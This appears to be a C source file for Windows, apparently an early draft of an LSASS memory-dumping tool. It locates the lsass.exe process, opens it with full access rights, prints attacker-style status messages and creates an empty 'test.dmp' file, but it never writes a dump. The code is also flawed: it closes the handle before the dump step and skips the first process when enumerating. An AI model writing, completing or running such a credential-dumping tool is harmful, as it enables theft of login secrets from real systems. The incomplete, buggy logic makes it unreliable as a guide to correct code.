#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int FindTarget(const char* procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // Take a snapshot of all the processes currently running
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (INVALID_HANDLE_VALUE == hProcSnap)
                return 0;

        // PROCESSENTRY32 is a struct that holds process info
        // setting dwSize ensure the code works correctly on 32-bit and 64-bit envs
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Check if any processes are currently running
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }

        while (Process32Next(hProcSnap, &pe32)) {
                // lstrcmpiA ignore the capitalization of the process letters
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        CloseHandle(hProcSnap);

        return pid;
}
int main() {
        const char* procname = "lsass.exe";
        printf("[*] Finding LSASS PID...\n");
        DWORD pid = FindTarget(procname); // Ta fonction

        printf("[*] Opening LSASS handle...\n");
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

        if (h) {
                printf("[+] Got handle\n");
                CloseHandle(h);
        }

        HANDLE hFile = CreateFileA("test.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(hFile);
        return 0;
}
